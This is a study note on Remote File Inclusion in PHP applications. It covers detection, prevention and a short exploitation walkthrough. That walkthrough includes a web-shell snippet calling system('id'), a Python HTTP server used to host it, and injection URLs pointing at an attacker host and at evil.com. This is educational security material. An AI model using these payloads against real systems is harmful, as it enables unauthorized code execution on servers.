# 12.rfi

14/05/25

## Recall

- What is RFI (Remote File Inclusion)?
- How is RFI different from LFI?
- What server configurations make RFI possible?
- What can an attacker achieve through RFI?
- How can developers prevent RFI vulnerabilities?

## Notes

### What it is

**Remote File Inclusion (RFI)** is a vulnerability that occurs when a web application dynamically includes files based on user input **and allows external URLs** to be passed as parameters. If the server is misconfigured (`allow_url_include = On` in PHP), it will download and execute remote content — giving the attacker a foothold for **Remote Code Execution (RCE)**.

Despite exploiting the same weakness as LFI (lack of input validation in file inclusion), RFI has distinct behavior:

|  | **LFI** | **RFI** |
| --- | --- | --- |
| Includes | Local files on the server | Remote files via URL |
| Goal | Read files, potentially achieve RCE via chaining | Direct RCE |
| Depends on | File path traversal | Server misconfig + external URLs |
| Example | `?page=../../etc/passwd` | `?page=http://evil.com/shell.txt` |

### How to identify it

To identify a RFI vulnerability, look for parameters in URLs that suggest dynamic file loading:

```bash
https://example.com/index.php?page=home
```

Begin injecting RFI payloads. Unlike LFI, RFI payloads use **fully qualified external URLs**:

```html
https://example.com/index.php?page=https://google.com
```

If the application renders the external page, or attempts to include and parse its contents, the vulnerability is likely present.

### How to exploit it

The primary goal of an RFI vulnerability is to load arbitrary remote code into the server — enabling **Remote Code Execution** using a type of **WebShell**.

Hosting a malicious script

```php
<?php
// rce.php
system("id");
```

Serving using a simple HTTP server

```bash
python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

with that, inject the URL on the application and see if the command is executed

```bash
https://example.com/index.php?page=http://your-ip:8000/rce.php
```

If executed, the attacker gains full command execution

## Summary

Remote File Inclusion (RFI) is a high-impact vulnerability that allows an attacker to include and execute remote files through user-supplied input. It arises when insecure code like is combined with insecure server configurations like. Exploiting RFI often leads to full Remote Code Execution, especially when the attacker hosts malicious scripts externally. While rare in hardened environments, RFI is still common in legacy systems, development environments, and poorly configured servers. Preventing RFI requires rejecting URLs in file includes, disabling dangerous directives, and controlling which files can be dynamically loaded.